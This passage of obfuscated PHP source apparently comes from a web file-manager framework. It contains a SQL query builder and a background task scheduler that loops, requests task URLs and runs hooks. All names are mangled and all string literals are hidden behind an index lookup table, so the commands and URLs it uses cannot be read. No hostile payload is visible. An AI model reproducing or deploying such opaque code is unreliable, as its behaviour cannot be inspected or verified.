substr($this->parseWhere($ÃõÅ·™Ä), 6); break; case $ÀüÍÅè…[1019]: parse_str($ÃõÅ·™Ä, $ãÎü·à‘); if (isset($ãÎü·à‘[$ÀüÍÅè…[996]])) { $©Û¬Â = $ÀüÍÅè…[53] . strtoupper($ãÎü·à‘[$ÀüÍÅè…[996]]) . $ÀüÍÅè…[53]; unset($ãÎü·à‘[$ÀüÍÅè…[996]]); } else { $©Û¬Â = $ÀüÍÅè…[1000]; } $õÓ“Á“ = array(); foreach ($ãÎü·à‘ as $˜İ¨ø¬Ÿ => $„“ øµ) { $õÓ“Á“[] = $this->parseKey($˜İ¨ø¬Ÿ) . $ÀüÍÅè…[1018] . $this->parseValue($„“ øµ); } $°§å¯éÒ = implode($©Û¬Â, $õÓ“Á“); break; } return $°§å¯éÒ; } protected function parseLimit($ƒ…ÖŸä’) { $µ±œè® =& $_SERVER[­á Ş³Ö]; return !empty($ƒ…ÖŸä’) ? $µ±œè®[51] . $ƒ…ÖŸä’ . $µ±œè®[53] : $µ±œè®[12]; } protected function parseJoin($š§ºˆ“Ç) { $Ù…ÔÁÁ =& $_SERVER[­á Ş³Ö]; $Ÿíø¹™ = $Ù…ÔÁÁ[12]; if (!empty($š§ºˆ“Ç)) { if (is_array($š§ºˆ“Ç)) { foreach ($š§ºˆ“Ç as $¼°ì“ => $Ò°ÎÑÂ·) { if (!1 !== stripos($Ò°ÎÑÂ·, $Ù…ÔÁÁ[1020])) { $Ÿíø¹™ .= $Ù…ÔÁÁ[53] . $Ò°ÎÑÂ·; } else { $Ÿíø¹™ .= $Ù…ÔÁÁ[1021] . $Ò°ÎÑÂ·; } } } else { $Ÿíø¹™ .= $Ù…ÔÁÁ[1021] . $š§ºˆ“Ç; } } $Ÿíø¹™ = preg_replace($Ù…ÔÁÁ[1022], think_config($Ù…ÔÁÁ[926]) . $Ù…ÔÁÁ[1023], $Ÿíø¹™); return $Ÿíø¹™; } protected function parseOrder($±øÒ©úÃ) { $ÍÈˆÕ¦ =& $_SERVER[­á Ş³Ö]; if (is_array($±øÒ©úÃ)) { $‹ôŠõÓ = array(); foreach ($±øÒ©úÃ as $°ÜµàÍè => $’­†¢¶”) { if (is_numeric($°ÜµàÍè)) { $‹ôŠõÓ[] = $this->parseKey($’­†¢¶”); } else { $’­†¢¶” = in_array(strtoupper(trim($’­†¢¶”)), array($ÍÈˆÕ¦[1024], $ÍÈˆÕ¦[1025])) ? $ÍÈˆÕ¦[53] . $’­†¢¶” : $ÍÈˆÕ¦[12]; if (preg_match($ÍÈˆÕ¦[1026], $°ÜµàÍè)) { $‹ôŠõÓ[] = $this->parseKey($°ÜµàÍè) . $’­†¢¶”; } else { think_exception($ÍÈˆÕ¦[1027] . $°ÜµàÍè); } } } $±øÒ©úÃ = implode($ÍÈˆÕ¦[50], $‹ôŠõÓ); } return !empty($±øÒ©úÃ) ? $ÍÈˆÕ¦[1028] . $±øÒ©úÃ : $ÍÈˆÕ¦[12]; } protected function parseGroup($€ËáÙ±İ) { $  ¨ŞÈ =& $_SERVER[­á Ş³Ö]; return !empty($€ËáÙ±İ) ? $  ¨ŞÈ[1029] . $€ËáÙ±İ : $  ¨ŞÈ[12]; } protected function parseHaving($½ş…Ã) { $°ïé»‰‡ =& $_SERVER[­á Ş³Ö]; return !empty($½ş…Ã) ? $°ïé»‰‡[1030] . $½ş…Ã : $°ïé»‰‡[12]; } protected function parseComment($‹ÁáÖ¦®) { $˜ıõ‰— =& $_SERVER[­á Ş³Ö]; return !empty($‹ÁáÖ¦®) ? $˜ıõ‰—[1031] . $‹ÁáÖ¦® . $˜ıõ‰—[1032] : $˜ıõ‰—[12]; } protected function parseDistinct($ãàÕ€€â) { $ğ„ìê£· =& $_SERVER[­á Ş³Ö]; return !empty($ãàÕ€€â) ? $ğ„ìê£·[1033] : $ğ„ìê£·[12]; } protected function parseUnion($š¢ÁÎá©) { $—Òò¼¸ =& $_SERVER[­á Ş³Ö]; if (empty($š¢ÁÎá©)) { return $—Òò¼¸[12]; } if (isset($š¢ÁÎá©[$—Òò¼¸[348]])) { $ïÈ¬æ‘Ş = $—Òò¼¸[1034]; unset($š¢ÁÎá©[$—Òò¼¸[348]]); } else { $ïÈ¬æ‘Ş = $—Òò¼¸[1035]; } foreach ($š¢ÁÎá© as $•ßÁØŒã) { $Ğå°­[] = $ïÈ¬æ‘Ş . (is_array($•ßÁØŒã) ? $this->buildSelectSql($•ßÁØŒã) : $•ßÁØŒã); } return implode($—Òò¼¸[53], $Ğå°­); } public function insert($ßş ûÌ, $²Ç©Õ³Ò = array(), $á’¢›¨¾ = false) { $©÷Ñ½ıí =& $_SERVER[­á Ş³Ö]; $¯ñÔë¹ó = $³¤¿ìŞ = array(); $this->model = $²Ç©Õ³Ò[$©÷Ñ½ıí[281]]; foreach ($ßş ûÌ as $Ë„†²” => $ôÊ©Šëá) { if (is_array($ôÊ©Šëá) && $©÷Ñ½ıí[297] == $ôÊ©Šëá[0]) { $³¤¿ìŞ[] = $this->parseKey($Ë„†²”); $¯ñÔë¹ó[] = $ôÊ©Šëá[1]; } elseif (is_scalar($ôÊ©Šëá) || is_null($ôÊ©Šëá)) { $³¤¿ìŞ[] = $this->parseKey($Ë„†²”); $¯ñÔë¹ó[] = $this->parseValue($ôÊ©Šëá); } } $şüÁĞÊš = ($á’¢›¨¾ ? $©÷Ñ½ıí[903] : $©÷Ñ½ıí[904]) . $©÷Ñ½ıí[905] . $this->parseTable($²Ç©Õ³Ò[$©÷Ñ½ıí[279]]) . $©÷Ñ½ıí[899] . implode($©÷Ñ½ıí[50], $³¤¿ìŞ) . $©÷Ñ½ıí[900] . implode($©÷Ñ½ıí[50], $¯ñÔë¹ó) . $©÷Ñ½ıí[901]; $şüÁĞÊš .= $this->parseLock(isset($²Ç©Õ³Ò[$©÷Ñ½ıí[840]]) ? $²Ç©Õ³Ò[$©÷Ñ½ıí[840]] : !1); $şüÁĞÊš .= $this->parseComment(!empty($²Ç©Õ³Ò[$©÷Ñ½ıí[354]]) ? $²Ç©Õ³Ò[$©÷Ñ½ıí[354]] : $©÷Ñ½ıí[12]); return $this->execute($şüÁĞÊš, $this->parseBind(!empty($²Ç©Õ³Ò[$©÷Ñ½ıí[285]]) ? $²Ç©Õ³Ò[$©÷Ñ½ıí[285]] : array())); } public function selectInsert($ÉéŠŞ³Û, $ú¨ñ¥îä, $„ÖÎñ›¹ = array()) { $…†¦ììò =& $_SERVER[­á Ş³Ö]; $this->model = $„ÖÎñ›¹[$…†¦ììò[281]]; if (is_string($ÉéŠŞ³Û)) { $ÉéŠŞ³Û = explode($…†¦ììò[50], $ÉéŠŞ³Û); } array_walk($ÉéŠŞ³Û, array($this, $…†¦ììò[902])); $ïš¯šÂù = $…†¦ììò[1036] . $this->parseTable($ú¨ñ¥îä) . $…†¦ììò[899] . implode($…†¦ììò[50], $ÉéŠŞ³Û) . $…†¦ììò[1014]; $ïš¯šÂù .= $this->buildSelectSql($„ÖÎñ›¹); return $this->execute($ïš¯šÂù, $this->parseBind(!empty($„ÖÎñ›¹[$…†¦ììò[285]]) ? $„ÖÎñ›¹[$…†¦ììò[285]] : array())); } public function update($’è¸ü£¦, $ø£ÊÚ‘) { $‡»ƒşŞ¨ =& $_SERVER[­á Ş³Ö]; $this->model = $ø£ÊÚ‘[$‡»ƒşŞ¨[281]]; $šÜíû·€ = $‡»ƒşŞ¨[1037] . $this->parseTable($ø£ÊÚ‘[$‡»ƒşŞ¨[279]]) . $this->parseSet($’è¸ü£¦) . $this->parseWhere(!empty($ø£ÊÚ‘[$‡»ƒşŞ¨[275]]) ? $ø£ÊÚ‘[$‡»ƒşŞ¨[275]] : $‡»ƒşŞ¨[12]) . $this->parseOrder(!empty($ø£ÊÚ‘[$‡»ƒşŞ¨[365]]) ? $ø£ÊÚ‘[$‡»ƒşŞ¨[365]] : $‡»ƒşŞ¨[12]) . $this->parseLimit(!empty($ø£ÊÚ‘[$‡»ƒşŞ¨[292]]) ? $ø£ÊÚ‘[$‡»ƒşŞ¨[292]] : $‡»ƒşŞ¨[12]) . $this->parseLock(isset($ø£ÊÚ‘[$‡»ƒşŞ¨[840]]) ? $ø£ÊÚ‘[$‡»ƒşŞ¨[840]] : !1) . $this->parseComment(!empty($ø£ÊÚ‘[$‡»ƒşŞ¨[354]]) ? $ø£ÊÚ‘[$‡»ƒşŞ¨[354]] : $‡»ƒşŞ¨[12]); return $this->execute($šÜíû·€, $this->parseBind(!empty($ø£ÊÚ‘[$‡»ƒşŞ¨[285]]) ? $ø£ÊÚ‘[$‡»ƒşŞ¨[285]] : array())); } public function delete($«Öï×¼Ú = array()) { $Ú¦¦ùÉ =& $_SERVER[­á Ş³Ö]; $this->model = $«Öï×¼Ú[$Ú¦¦ùÉ[281]]; $ı·ä«µò = $Ú¦¦ùÉ[1038] . $this->parseTable($«Öï×¼Ú[$Ú¦¦ùÉ[279]]) . $this->parseWhere(!empty($«Öï×¼Ú[$Ú¦¦ùÉ[275]]) ? $«Öï×¼Ú[$Ú¦¦ùÉ[275]] : $Ú¦¦ùÉ[12]) . $this->parseOrder(!empty($«Öï×¼Ú[$Ú¦¦ùÉ[365]]) ? $«Öï×¼Ú[$Ú¦¦ùÉ[365]] : $Ú¦¦ùÉ[12]) . $this->parseLimit(!empty($«Öï×¼Ú[$Ú¦¦ùÉ[292]]) ? $«Öï×¼Ú[$Ú¦¦ùÉ[292]] : $Ú¦¦ùÉ[12]) . $this->parseLock(isset($«Öï×¼Ú[$Ú¦¦ùÉ[840]]) ? $«Öï×¼Ú[$Ú¦¦ùÉ[840]] : !1) . $this->parseComment(!empty($«Öï×¼Ú[$Ú¦¦ùÉ[354]]) ? $«Öï×¼Ú[$Ú¦¦ùÉ[354]] : $Ú¦¦ùÉ[12]); return $this->execute($ı·ä«µò, $this->parseBind(!empty($«Öï×¼Ú[$Ú¦¦ùÉ[285]]) ? $«Öï×¼Ú[$Ú¦¦ùÉ[285]] : array())); } public function select($ÕàáÀä« = array()) { $â¢Ëä­ =& $_SERVER[­á Ş³Ö]; $this->model = $ÕàáÀä«[$â¢Ëä­[281]]; $’ŞŒÎ•¶ = $this->buildSelectSql($ÕàáÀä«); $ÅØá§Ÿ = isset($ÕàáÀä«[$â¢Ëä­[349]]) ? $ÕàáÀä«[$â¢Ëä­[349]] : !1; if ($ÅØá§Ÿ) { $£„›ğš± = is_string($ÅØá§Ÿ[$â¢Ëä­[94]]) ? $ÅØá§Ÿ[$â¢Ëä­[94]] : $â¢Ëä­[1039] . md5($’ŞŒÎ•¶); $½Ášö = think_cache($£„›ğš±, $â¢Ëä­[12], $ÅØá§Ÿ); if (!1 !== $½Ášö) { return $½Ášö; } } $ÖïÃ¤øĞ = $this->query($’ŞŒÎ•¶, $this->parseBind(!empty($ÕàáÀä«[$â¢Ëä­[285]]) ? $ÕàáÀä«[$â¢Ëä­[285]] : array())); if ($ÅØá§Ÿ && !1 !== $ÖïÃ¤øĞ) { think_cache($£„›ğš±, $ÖïÃ¤øĞ, $ÅØá§Ÿ); } return $ÖïÃ¤øĞ; } public function buildSelectSql($ú¨¾ƒİñ = array()) { $­µĞæê =& $_SERVER[­á Ş³Ö]; if (isset($ú¨¾ƒİñ[$­µĞæê[353]])) { if (strpos($ú¨¾ƒİñ[$­µĞæê[353]], $­µĞæê[50])) { list($†ò¶ÅŸÅ, $¤§ñŞÉ½) = explode($­µĞæê[50], $ú¨¾ƒİñ[$­µĞæê[353]]); } else { $†ò¶ÅŸÅ = $ú¨¾ƒİñ[$­µĞæê[353]]; } $†ò¶ÅŸÅ = $†ò¶ÅŸÅ ? $†ò¶ÅŸÅ : 1; $¤§ñŞÉ½ = isset($¤§ñŞÉ½) ? $¤§ñŞÉ½ : (is_numeric($ú¨¾ƒİñ[$­µĞæê[292]]) ? $ú¨¾ƒİñ[$­µĞæê[292]] : 20); $¸¦À¿ = $¤§ñŞÉ½ * ((int) $†ò¶ÅŸÅ - 1); $ú¨¾ƒİñ[$­µĞæê[292]] = $¸¦À¿ . $­µĞæê[50] . $¤§ñŞÉ½; } if (think_config($­µĞæê[1040])) { $»›ÖÂìÀ = $­µĞæê[1041] . md5(serialize($ú¨¾ƒİñ)); $¦–§ûò’ = think_cache($»›ÖÂìÀ); if ($¦–§ûò’) { return $¦–§ûò’; } } $á½Üëäå = $this->parseSql($this->selectSql, $ú¨¾ƒİñ); $á½Üëäå .= $this->parseLock(isset($ú¨¾ƒİñ[$­µĞæê[840]]) ? $ú¨¾ƒİñ[$­µĞæê[840]] : !1); if (isset($»›ÖÂìÀ)) { think_cache($»›ÖÂìÀ, $á½Üëäå); } return $á½Üëäå; } public function parseSql($ó¿ÛÔ•à, $˜ì„Äüµ = array()) { $ô×àû˜ü =& $_SERVER[­á Ş³Ö]; $ó¿ÛÔ•à = str_replace(array($ô×àû˜ü[1042], $ô×àû˜ü[1043], $ô×àû˜ü[1044], $ô×àû˜ü[1045], $ô×àû˜ü[1046], $ô×àû˜ü[1047], $ô×àû˜ü[1048], $ô×àû˜ü[1049], $ô×àû˜ü[1050], $ô×àû˜ü[1051], $ô×àû˜ü[1052]), array($this->parseTable("{$˜ì„Äüµ[$ô×àû˜ü[279]]}"), $this->parseDistinct(isset($˜ì„Äüµ[$ô×àû˜ü[1053]]) ? $˜ì„Äüµ[$ô×àû˜ü[1053]] : !1), $this->parseField(!empty($˜ì„Äüµ[$ô×àû˜ü[273]]) ? $˜ì„Äüµ[$ô×àû˜ü[273]] : $ô×àû˜ü[189]), $this->parseJoin(!empty($˜ì„Äüµ[$ô×àû˜ü[282]]) ? $˜ì„Äüµ[$ô×àû˜ü[282]] : $ô×àû˜ü[12]), $this->parseWhere(!empty($˜ì„Äüµ[$ô×àû˜ü[275]]) ? $˜ì„Äüµ[$ô×àû˜ü[275]] : $ô×àû˜ü[12]), $this->parseGroup(!empty($˜ì„Äüµ[$ô×àû˜ü[505]]) ? $˜ì„Äüµ[$ô×àû˜ü[505]] : $ô×àû˜ü[12]), $this->parseHaving(!empty($˜ì„Äüµ[$ô×àû˜ü[1054]]) ? $˜ì„Äüµ[$ô×àû˜ü[1054]] : $ô×àû˜ü[12]), $this->parseOrder(!empty($˜ì„Äüµ[$ô×àû˜ü[365]]) ? $˜ì„Äüµ[$ô×àû˜ü[365]] : $ô×àû˜ü[12]), $this->parseLimit(!empty($˜ì„Äüµ[$ô×àû˜ü[292]]) ? $˜ì„Äüµ[$ô×àû˜ü[292]] : $ô×àû˜ü[12]), $this->parseUnion(!empty($˜ì„Äüµ[$ô×àû˜ü[347]]) ? $˜ì„Äüµ[$ô×àû˜ü[347]] : $ô×àû˜ü[12]), $this->parseComment(!empty($˜ì„Äüµ[$ô×àû˜ü[354]]) ? $˜ì„Äüµ[$ô×àû˜ü[354]] : $ô×àû˜ü[12])), $ó¿ÛÔ•à); return $ó¿ÛÔ•à; } public function getLastSql($•İ‚ùÔ = '') { return $•İ‚ùÔ ? $this->modelSql[$•İ‚ùÔ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($­—¬¨èÀ) { return addslashes($­—¬¨èÀ); } public function setModel($×ñ† Ê”) { $this->model = $×ñ† Ê”; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto föÜÆôù; fÖ¬Œ†‹­: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $±ëµº—æ =& $_SERVER[­á Ş³Ö]; if (self::valueGet($±ëµº—æ[746]) != $±ëµº—æ[88]) { return; } if (self::valueGet($±ëµº—æ[1622]) == $±ëµº—æ[88]) { $Çáø¡‘ö = self::valueGet($±ëµº—æ[1623]); if (time() - $Çáø¡‘ö > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$±ëµº—æ[1624]] = 1; self::valueSet($±ëµº—æ[1622], $±ëµº—æ[88]); self::log($±ëµº—æ[1625] . ACTION . $±ëµº—æ[1626]); Session::$data = array(); Session::$sessionSign = $±ëµº—æ[12]; $GLOBALS[$±ëµº—æ[494]] = 1; Hook::bind($±ëµº—æ[1627], $±ëµº—æ[1628]); $˜‹¶ = 0; while (!0) { self::cacheClear(); if (self::valueGet($±ëµº—æ[746]) != $±ëµº—æ[88]) { self::valueSet($±ëµº—æ[1622], $±ëµº—æ[198]); self::log($±ëµº—æ[1629]); die; } $ùÊşºï˜ = time(); if ($ùÊşºï˜ - $˜‹¶ >= 60) { self::valueSet(array($±ëµº—æ[1622] => $±ëµº—æ[88], $±ëµº—æ[1623] => $ùÊşºï˜), !1); $˜‹¶ = $ùÊşºï˜; } if (!file_exists(USER_SYSTEM . $±ëµº—æ[1630])) { self::valueSet(array($±ëµº—æ[1622] => $±ëµº—æ[198], $±ëµº—æ[746] => $±ëµº—æ[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ÛÏì²Ù• =& $_SERVER[­á Ş³Ö]; http_close(); self::valueSet($ÛÏì²Ù•[746], $ÛÏì²Ù•[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÛÏì²Ù•[1622] => $ÛÏì²Ù•[198], $ÛÏì²Ù•[746] => $ÛÏì²Ù•[88]), !1); } public static function taskSwitch() { $ş†ª¹œŒ =& $_SERVER[­á Ş³Ö]; $â©º‘½ = self::valueGet($ş†ª¹œŒ[746]) == $ş†ª¹œŒ[88] ? $ş†ª¹œŒ[198] : $ş†ª¹œŒ[88]; self::valueSet($ş†ª¹œŒ[746], $â©º‘½); } public static function shutdownEvent() { $èÉæ²ø“ =& $_SERVER[­á Ş³Ö]; self::valueSet($èÉæ²ø“[1622], $èÉæ²ø“[198]); self::log($èÉæ²ø“[1631]); } public static function config($Ï”ÄØ¨ö, $ºëƒÎ®×) { self::valueSet($_SERVER[­á Ş³Ö][746], $Ï”ÄØ¨ö); } private static function taskRunAll() { $Å—İ…ôÈ =& $_SERVER[­á Ş³Ö]; $ÔŸÜÒóà = timeFloat(); $ËèŞîµ— = Model($Å—İ…ôÈ[1632])->listData(); $”ŸĞ¶Ëñ = count($ËèŞîµ—); for ($¬·û†ÚŸ = 0; $¬·û†ÚŸ < $”ŸĞ¶Ëñ; $¬·û†ÚŸ++) { $ì¥¡‚›… = $ËèŞîµ—[$¬·û†ÚŸ]; if (!$ì¥¡‚›…[$Å—İ…ôÈ[399]] || $ì¥¡‚›…[$Å—İ…ôÈ[1633]] != $Å—İ…ôÈ[88]) { continue; } if (!self::taskTimeCheck($ì¥¡‚›…)) { continue; } self::taskRun($ì¥¡‚›…); } Hook::trigger($Å—İ…ôÈ[1634]); self::taskQueueRun($ÔŸÜÒóà); } private static function taskQueueRun($¸”ŞŸ·Ê) { $Øîç•¢à = 10; while (!0) { $ªæ˜×« = TaskQueue::run(); if ($ªæ˜×« === !1) { break; } if (timeFloat() - $¸”ŞŸ·Ê >= $Øîç•¢à) { break; } } } private static function taskTimeCheck($«ô¬Õ) { $«ñÑå½Ç =& $_SERVER[­á Ş³Ö]; $Œ‰€… = json_decode($«ô¬Õ[$«ñÑå½Ç[180]], !0); $˜Ï¡š¹È = intval($«ô¬Õ[$«ñÑå½Ç[1623]]); $ØĞÎçšÍ = strtotime($«ñÑå½Ç[1635] . $Œ‰€…[$«ñÑå½Ç[1636]] . $«ñÑå½Ç[1637]) - strtotime($«ñÑå½Ç[1638]); $£éÃóœÉ = time() - strtotime(date($«ñÑå½Ç[1639]) . $«ñÑå½Ç[1640]); $šŸÄäƒù = $£éÃóœÉ >= $ØĞÎçšÍ && $£éÃóœÉ <= $ØĞÎçšÍ + 3600; switch ($Œ‰€…[$«ñÑå½Ç[33]]) { case $«ñÑå½Ç[1641]: if (time() - $˜Ï¡š¹È < 3600 * 24 * 30) { return !1; } if ($Œ‰€…[$«ñÑå½Ç[1641]] == date($«ñÑå½Ç[1642]) && $šŸÄäƒù) { return !0; } break; case $«ñÑå½Ç[1643]: if (time() - $˜Ï¡š¹È < 3600 * 24 * 7) { return !1; } $óä¸´ù = date($«ñÑå½Ç[1644]) == 0 ? 7 : date($«ñÑå½Ç[1644]); if ($Œ‰€…[$«ñÑå½Ç[1643]] == $óä¸´ù && $šŸÄäƒù) { return !0; } break; case $«ñÑå½Ç[1636]: if (time() - $˜Ï¡š¹È < 3600 * 24) { return !1; } if ($šŸÄäƒù) { return !0; } break; case $«ñÑå½Ç[1645]: if (time() - $˜Ï¡š¹È >= floatval($Œ‰€…[$«ñÑå½Ç[1645]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $æÔáÓİä =& $_SERVER[­á Ş³Ö]; static $ë§Ï‚óĞ = 0; $Ñ¾ÚØÁ = 300; if (!$ë§Ï‚óĞ) { $ë§Ï‚óĞ = time(); } if (time() - $ë§Ï‚óĞ < $Ñ¾ÚØÁ) { return; } $ë§Ï‚óĞ = time(); $õ€òú²ô = Model($æÔáÓİä[504])->db($æÔáÓİä[12]); if ($õ€òú²ô) { $õ€òú²ô->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($æÔáÓİä[1646], $æÔáÓİä[1647]); die; } } public static function taskRun($¢Ù‰ÕÆÓ) { $˜èÌ¹Ìó =& $_SERVER[­á Ş³Ö]; self::log($˜èÌ¹Ìó[1648] . $¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[399]] . $˜èÌ¹Ìó[1649] . $¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[32]] . $˜èÌ¹Ìó[1650] . $¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[1651]]); Model($˜èÌ¹Ìó[1632])->run($¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[399]]); $«­ˆÏåñ = timeFloat(); $¬—Œ¦¿ = $˜èÌ¹Ìó[12]; switch ($¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[33]]) { case $˜èÌ¹Ìó[307]: $úæ¨±Ï = url_request($¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[1651]], $˜èÌ¹Ìó[230], !1, !1, !1, !1, 10); if ($úæ¨±Ï[$˜èÌ¹Ìó[746]]) { $¬—Œ¦¿ = strlen($úæ¨±Ï[$˜èÌ¹Ìó[1198]]); } break; case $˜èÌ¹Ìó[229]: $¬—Œ¦¿ = Hook::apply($¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[1651]]); default: break; } Model($˜èÌ¹Ìó[1652])->add(array($˜èÌ¹Ìó[1653] => $˜èÌ¹Ìó[12], $˜èÌ¹Ìó[1654] => $˜èÌ¹Ìó[198], $˜èÌ¹Ìó[33] => $˜èÌ¹Ìó[1655] . $¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[399]], $˜èÌ¹Ìó[1656] => json_encode(array($˜èÌ¹Ìó[32] => $¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[32]], $˜èÌ¹Ìó[1657] => timeFloat() - $«­ˆÏåñ, $˜èÌ¹Ìó[293] => $¬—Œ¦¿)))); $ÁÃ”‡œ = $¬—Œ¦¿ ? $˜èÌ¹Ìó[1658] . $¬—Œ¦¿ : $˜èÌ¹Ìó[12]; self::log($˜èÌ¹Ìó[1659] . $¢Ù‰ÕÆÓ[$˜èÌ¹Ìó[399]] . $˜èÌ¹Ìó[164] . $ÁÃ”‡œ); return !0; } private static function valueGet($Õšİş) { $Ù”²¶üã =& $_SERVER[­á Ş³Ö]; $Şé„‰— = $Ù”²¶üã[1660]; $­ÊİèÆ° = Model($Ù”²¶üã[435])->get($Õšİş, $Şé„‰—); if (is_null($­ÊİèÆ°)) { Model($Ù”²¶üã[435])->set($Ù”²¶üã[746], $Ù”²¶üã[88], $Şé„‰—); Model($Ù”²¶üã[435])->set($Ù”²¶üã[1622], $Ù”²¶üã[198], $Şé„‰—); $­ÊİèÆ° = Model($Ù”²¶üã[435])->get($Õšİş, $Şé„‰—); } return $­ÊİèÆ°; } private static function valueSet($ŞÚ•ÎÃ—, $‰‹‰ƒğ±) { $Äú¼•©¤ =& $_SERVER[­á Ş³Ö]; $¢œØúïÊ = $Äú¼•©¤[1661]; CacheLock::lock($¢œØúïÊ); $‚ºÂÜÄ¥ = Model($Äú¼•©¤[435])->set($ŞÚ•ÎÃ—, $‰‹‰ƒğ±, $Äú¼•©¤[1660]); CacheLock::unlock($¢œØúïÊ); return $‚ºÂÜÄ¥; } protected static function log($œãª°ëÌ) { write_log($œãª°ëÌ, $_SERVER[­á Ş³Ö][1647]); } private static function cacheClear() { $èÔÂ®ú =& $_SERVER[­á Ş³Ö]; Cache::clearMemory(Model($èÔÂ®ú[435])->cacheKey($èÔÂ®ú[1660])); Cache::clearMemory(Model($èÔÂ®ú[435])->cacheKey($èÔÂ®ú[1662])); Model($èÔÂ®ú[1632])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\162\x75\x6e\156\x69\x6e\147"; const STATYS_KILL = "\153\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÏïáÔî, $š¶ÇØšÚ = '', $şÍà…»Ï = 0, $ìó½Èõ„ = '') { $Õë»ùÔ =& $_SERVER[­á Ş³Ö]; if (self::get($ÏïáÔî)) { return; } $this->task = array($Õë»ùÔ[399] => $ÏïáÔî, $Õë»ùÔ[1663] => USER_ID, $Õë»ùÔ[1561] => $ìó½Èõ„, $Õë»ùÔ[453] => $Õë»ùÔ[12], $Õë»ùÔ[33] => $š¶ÇØšÚ, $Õë»ùÔ[1060] => $Õë»ùÔ[12], $Õë»ùÔ[783] => $şÍà…»Ï, $Õë»ùÔ[1664] => 0, $Õë»ùÔ[1665] => 0, $Õë»ùÔ[1666] => 0, $Õë»ùÔ[1667] => timeFloat(), $Õë»ùÔ[1668] => 0, $Õë»ùÔ[1669] => 0, $Õë»ùÔ[1670] => 0, $Õë»ùÔ[1671] => 0, $Õë»ùÔ[746] => $Õë»ùÔ[1622]); $GLOBALS[$Õë»ùÔ[1672]] = 1; Hook::bind($Õë»ùÔ[1627], array($this, $Õë»ùÔ[1673])); Hook::bind($Õë»ùÔ[1674], array($this, $Õë»ùÔ[1675])); $this->startAfter(); Hook::trigger($Õë»ùÔ[1676], $this->task); $this->task[$Õë»ùÔ[1669]] = timeFloat(); } public function end($«Ìëéç³ = '') { $À¡¢˜Ö¸ =& $_SERVER[­á Ş³Ö]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$À¡¢˜Ö¸[1669]]) { self::valueSet($this->task[$À¡¢˜Ö¸[399]], !1); } $this->isEnd = !0; if ($«Ìëéç³) { $this->task[$À¡¢˜Ö¸[453]] = $«Ìëéç³; } self::log($À¡¢˜Ö¸[1677] . $this->task[$À¡¢˜Ö¸[399]] . $À¡¢˜Ö¸[1678] . sprintf($À¡¢˜Ö¸[847], timeFloat() - $this->task[$À¡¢˜Ö¸[1667]]) . $À¡¢˜Ö¸[1679]); Hook::unbind($À¡¢˜Ö¸[1627], array($this, $À¡¢˜Ö¸[1673])); Hook::unbind($À¡¢˜Ö¸[1674], array($this, $À¡¢˜Ö¸[1675])); $this->endAfter(); $ä—¸”Óó = $this->task; $this->task = !1; Hook::trigger($À¡¢˜Ö¸[1680], $ä—¸”Óó); } public function update($ğÔñ½ÆÒ = 0, $ŞşµÅ = false) { $ëÁÉ­ß° =& $_SERVER[­á Ş³Ö]; $ºŞƒÚ€ =& $this->task; if (!$ºŞƒÚ€) { return; } $ºŞƒÚ€[$ëÁÉ­ß°[1664]] += $ğÔñ½ÆÒ; $ºŞƒÚ€[$ëÁÉ­ß°[1668]] = timeFloat(); if ($ºŞƒÚ€[$ëÁÉ­ß°[783]]) { if ($ºŞƒÚ€[$ëÁÉ­ß°[783]] < $ºŞƒÚ€[$ëÁÉ­ß°[1664]]) { $ºŞƒÚ€[$ëÁÉ­ß°[783]] = $ºŞƒÚ€[$ëÁÉ­ß°[1664]]; } $ÛÓÓ Œ‡ = timeFloat() - $ºŞƒÚ€[$ëÁÉ­ß°[1667]] - $ºŞƒÚ€[$ëÁÉ­ß°[1670]]; if ($ÛÓÓ Œ‡ <= 0) { $ÛÓÓ Œ‡ = 0.001; } $ºŞƒÚ€[$ëÁÉ­ß°[1665]] = $ºŞƒÚ€[$ëÁÉ­ß°[1664]] / $ºŞƒÚ€[$ëÁÉ­ß°[783]]; $ºŞƒÚ€[$ëÁÉ­ß°[1666]] = $ºŞƒÚ€[$ëÁÉ­ß°[1664]] / $ÛÓÓ Œ‡; if ($ºŞƒÚ€[$ëÁÉ­ß°[1665]] > 0) { $ºŞƒÚ€[$ëÁÉ­ß°[1671]] = $ÛÓÓ Œ‡ * (1 - $ºŞƒÚ€[$ëÁÉ­ß°[1665]]) / $ºŞƒÚ€[$ëÁÉ­ß°[1665]]; } $ºŞƒÚ€[$ëÁÉ­ß°[1671]] = $ºŞƒÚ€[$ëÁÉ­ß°[1671]] <= 0 ? 0 : $ºŞƒÚ€[$ëÁÉ­ß°[1671]]; } $this->updateAfter(); $ç¨Â¥ = 0.2; if (timeFloat() - $ºŞƒÚ€[$ëÁÉ­ß°[1669]] < $ç¨Â¥ && !$ŞşµÅ) { return; } $ÜÚßÇ² = self::get($ºŞƒÚ€[$ëÁÉ­ß°[399]]); $×»åÒÊ² = $ÜÚßÇ²[$ëÁÉ­ß°[746]]; if ($×»åÒÊ² == self::STATYS_KILL) { $—ñæüÂô = array($ëÁÉ­ß°[1681] => LNG($ëÁÉ­ß°[1682]), $ëÁÉ­ß°[1208] => !1); Cache::set($ëÁÉ­ß°[1683] . $this->task[$ëÁÉ­ß°[399]], $—ñæüÂô, 30); $this->onKill(); $this->end(); die; } else { if 